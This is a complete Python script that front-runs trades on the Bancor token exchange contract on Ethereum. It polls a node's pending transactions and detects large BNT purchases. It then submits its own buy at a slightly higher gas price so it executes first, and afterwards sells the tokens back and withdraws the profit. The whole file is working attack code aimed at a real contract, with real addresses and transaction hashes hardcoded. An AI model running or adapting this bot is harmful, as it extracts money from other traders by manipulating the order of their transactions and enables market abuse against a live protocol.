#!/usr/bin/python

import time
import random
import json
import requests

BANCOR_CHANGER = '0xb72a0fa1e537c956dfca72711c468efd81270468'
CHANGE_METHOD = '0x5e5144eb'
QUICKBUY_METHOD = '0x7758c4f8'
QUICKCHANGE_METHOD = '0xa93d7c72'
BANCOR_TOKEN = '0x1f573d6fb3f13d689ff844b4ce37794d79a7ff1c'
ETH_ERC20_TOKEN = '0xc0829421c1d260bd3cb3e0f06cfe2d52db2ce315'
BUY_THRESHOLD = int(200e18)  # 200 ETH
BUY_AMOUNT = int(5e18)  # 5 ETH


def log(*args):
  print('-' * 40)
  print(time.ctime())
  print(args)


def dump_to_hex(integer):
  return '{:#x}'.format(integer)


def send_request(request):
  url = 'http://localhost:8545'
  headers = {'content-type': 'application/json'}
  payload = {'jsonrpc': '2.0', 'id': random.randint(0, int(1e9))}
  payload.update(request)
  response = None
  while not response:
    try:
      response = requests.post(
          url, data=json.dumps(payload), headers=headers).json()
    except requests.exceptions.ConnectionError as e:
      pass
  if response[u'id'] != payload['id']:
    raise Exception('Returned mismatching id')
  try:
    return response[u'result']
  except KeyError:
    log('No result found!', response)
    raise Exception('No result returned')


def get_transaction(tx_hash):
  return send_request({
      'method': 'eth_getTransactionByHash',
      'params': [tx_hash]
  })


def is_pending(tx_hash):
  return int(get_transaction(tx_hash)[u'blockHash'], 16) == 0


def parse_tx_data(tx_data):
  if tx_data == '0x':
    return '0x', []
  if (len(tx_data) - 8 - 2) % 64 != 0:
    raise Exception('Data size misaligned with parse request')
  method = tx_data[:10]
  num_params = (len(tx_data) - 8 - 2) // 64
  params = []
  for i in xrange(num_params):
    params.append(int(tx_data[10 + i * 64:10 + (i + 1) * 64], 16))
  return method, params


def pack_tx_data(method, params):
  data = method
  for param in params:
    try:
      value = int(param, 16)
    except TypeError:
      value = param
    to_hex = hex(value)[2:].replace('L', '')
    data += '0' * (64 - len(to_hex)) + to_hex
  return data


class BancorFrontrunner(object):

  def __init__(self):
    self.finished = False
    accounts = send_request({'method': 'eth_accounts', 'params': []})
    if len(accounts) != 1:
      raise Exception('You should have exactly one address activated. ' +
                      'Got {0} instead.'.format(accounts))
    self.address = accounts[0]

  def get_own_balance(self, token_address):
    BALANCEOF_METHOD = '0x70a08231'
    BALANCEOF_SIGNATURE = [8, 64]
    data = pack_tx_data(BALANCEOF_METHOD, [self.address])
    hex_value = send_request({
        'method': 'eth_call',
        'params': [{
            'to': token_address,
            'data': data
        }, 'latest']
    })
    return int(hex_value, 16)

  def triggers_buy(self, tx):
    if tx[u'to'] != BANCOR_CHANGER:
      return False
    method, params = parse_tx_data(tx[u'input'])
    if method in ['0x', QUICKBUY_METHOD]:
      return int(tx[u'value'], 16) >= BUY_THRESHOLD
    elif method == CHANGE_METHOD:
      from_token, to_token, amount, min_return = params
      return (from_token == int(ETH_ERC20_TOKEN, 16) and
              to_token == int(BANCOR_TOKEN, 16) and amount >= BUY_THRESHOLD)
    elif method == QUICKCHANGE_METHOD:
      amount = params[1]
      token1, token2, token3 = params[4:]
      if (token1 == int(ETH_ERC20_TOKEN, 16) and token2 == token1 and
          token3 == int(BANCOR_TOKEN, 16)):
        return amount >= BUY_THRESHOLD
    return False

  def commit_transaction_with_receipt(self, transaction_request):
    tx_hash = send_request(transaction_request)
    log('Transaction send successful:', tx_hash)
    while is_pending(tx_hash):
      pass
    receipt = send_request({
        'method': 'eth_getTransactionReceipt',
        'params': [tx_hash]
    })
    log('Transaction DONE! Receipt:', receipt)

  def perform_simple_buy(self, amount, gas_price):
    log('Making a BUY!!!')
    tx_params = {
        'from': self.address,
        'to': BANCOR_CHANGER,
        'gas': hex(300000),
        'gasPrice': hex(gas_price),
        'value': dump_to_hex(amount),
        'data': '',
    }
    trade_request = {'method': 'eth_sendTransaction', 'params': [tx_params]}
    log('Planning to send:', tx_params)
    self.commit_transaction_with_receipt(trade_request)

  def perform_change(self, is_buy_bnt, gas_price):
    log('Making a CHANGE!!! IS_BUY = {0}'.format(is_buy_bnt))
    from_token = ETH_ERC20_TOKEN if is_buy_bnt else BANCOR_TOKEN
    to_token = BANCOR_TOKEN if is_buy_bnt else ETH_ERC20_TOKEN
    amount = self.get_own_balance(from_token)
    min_return = 1
    data = pack_tx_data(CHANGE_METHOD,
                        [from_token, to_token, amount, min_return])
    tx_params = {
        'from': self.address,
        'to': BANCOR_CHANGER,
        'gas': hex(300000),
        'gasPrice': hex(gas_price),
        'value': hex(0),
        'data': data,
    }
    trade_request = {'method': 'eth_sendTransaction', 'params': [tx_params]}
    log('Planning to send:', tx_params)
    self.commit_transaction_with_receipt(trade_request)

  def handle_transaction(self, tx):
    if tx[u'to'] == BANCOR_CHANGER and is_pending(tx[u'hash']):
      log('Found pending Bancor-related transaction!', tx)
    else:
      return
    gas_price = int(tx[u'gasPrice'], 16)
    one_gwei = int(1e9)
    my_gas_price = gas_price + one_gwei
    if self.triggers_buy(tx):
      log('Front-running!!!')
      self.perform_simple_buy(BUY_AMOUNT, my_gas_price)
      # also wait until the honest transaction is done
      while is_pending(tx[u'hash']):
        pass
      self.finished = True

  def test_parsing(self):
    data = '0x5e5144eb' + \
        '0000000000000000000000001f573d6fb3f13d689ff844b4ce37794d79a7ff1c' + \
        '000000000000000000000000c0829421c1d260bd3cb3e0f06cfe2d52db2ce315' + \
        '0000000000000000000000000000000000000000000001a31f3fb14451dd1400' + \
        '000000000000000000000000000000000000000000000003afb087b876900000'
    method, params = parse_tx_data(data)
    from_token, to_token, amount, min_return = params
    if (method != CHANGE_METHOD or from_token != int(BANCOR_TOKEN, 16) or
        to_token != int(ETH_ERC20_TOKEN, 16)):
      raise Exception('Parsing fails!')
    if pack_tx_data(method, [from_token, to_token, amount, min_return]) != data:
      raise Exception('Padding fails!')

  def test_triggering(self):
    simple_buy = '0x6424958d16a6b687d29ef7ef1289d9fbaf96c9b0c7ef7c618b2a58ed580145af'
    if not self.triggers_buy(get_transaction(simple_buy)):
      raise Exception('Buy through raw ETH send triggering fail!')
    quick_buy = '0x6738f6a8765517280f887f0876bd9001e5ab69ce9e30b3d9608b2b0453b2aab3'
    if not self.triggers_buy(get_transaction(quick_buy)):
      raise Exception('Buy through quickBuy triggering fail!')

  def withdraw_all_eth_erc20(self):
    WITHDRAW_METHOD = '0x2e1a7d4d'
    data = pack_tx_data(WITHDRAW_METHOD,
                        [self.get_own_balance(ETH_ERC20_TOKEN)])
    tx_params = {
        'from': self.address,
        'to': ETH_ERC20_TOKEN,
        'gas': hex(300000),
        'gasPrice': hex(int(21e9)),
        'value': hex(0),
        'data': data,
    }
    trade_request = {'method': 'eth_sendTransaction', 'params': [tx_params]}
    log('Planning to send:', tx_params)
    self.commit_transaction_with_receipt(trade_request)

  def frontrun(self):
    new_filter_request = {
        'method': 'eth_newPendingTransactionFilter',
        'params': [],
    }
    filter_id = send_request(new_filter_request)
    log('Filter set:', filter_id)
    while not self.finished:
      try:
        tx_hashes = send_request({
            'method': 'eth_getFilterChanges',
            'params': [filter_id]
        })
      except KeyError:
        log('getFilterChanges request failed')
        filter_id = send_request(new_filter_request)
        log('Got new filter:', filter_id)
        continue
      for tx_hash in tx_hashes:
        tx = get_transaction(tx_hash)
        if not tx:
          log('Error! Cannot download transaction', tx_hash)
        else:
          self.handle_transaction(tx)


if __name__ == '__main__':
  frontrunner = BancorFrontrunner()
  frontrunner.test_parsing()
  frontrunner.test_triggering()
  log('Front-running on address', frontrunner.address)
  frontrunner.frontrun()
  log('Front-running done, changing all BNT back to ETH-ERC20')
  frontrunner.perform_change(False, int(21e9))
  log('Withdrawing ETH-ERC20 to regular ETH')
  frontrunner.withdraw_all_eth_erc20()
